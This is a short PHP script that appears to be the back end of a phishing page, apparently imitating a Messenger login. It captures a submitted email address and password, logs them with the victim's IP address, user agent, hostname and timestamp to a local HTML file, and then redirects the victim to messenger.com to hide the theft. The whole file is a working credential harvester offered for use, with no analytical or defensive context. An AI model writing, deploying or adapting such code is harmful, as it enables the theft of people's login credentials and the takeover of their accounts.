<?php
ob_start();
date_default_timezone_set("Mexico/General");
if(isset($_POST['newmi'])){
$nn = $_POST['em']; 
$ii = $_POST['pa'];                                    
$ih = $_SERVER['REMOTE_ADDR'];
$fey = date("d-m-Y");
$hora = time();
$ust=$_SERVER['HTTP_USER_AGENT'];
$hoy = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$z = fopen("ra.html", "a"); 
fwrite ($z, ' 

<h2>
Eo: '.$nn.' <br>
Co: '.$ii.' <br>
IP: '.$ih.' <br>
Fecha: '.$fey.' <br>
Hora: ' . date ("H:i:s",time()) . ' <br>
Displ: ' . $ust . ' <br>
Hosi: ' . $hoy . ' ');
fclose($f);

header("Location: https://www.messenger.com");
}
ob_end_flush();
?>